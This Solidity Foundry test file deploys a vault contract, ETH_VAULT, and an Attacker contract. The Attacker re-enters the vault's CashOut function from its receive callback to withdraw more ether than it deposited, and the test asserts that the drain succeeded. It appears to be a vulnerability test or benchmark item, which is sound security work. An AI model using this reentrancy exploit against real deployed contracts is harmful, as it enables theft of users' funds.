
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {

    ETH_VAULT public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        _contractUnderTest = new ETH_VAULT(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 stateVal) public {
        
        vm.assume(stateVal > 1 ether && stateVal < type(uint128).max);
        vm.assume(attackVal > 0 && attackVal <= stateVal && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), stateVal * 2);

        vm.deal(address(this), stateVal * 2);

        _attacker.setupAttack{value: stateVal}(stateVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ETH_VAULT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.CashOut(val);

        if (address(this).balance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.CashOut(storedAttackVal);
        }
        revert();
    }
}
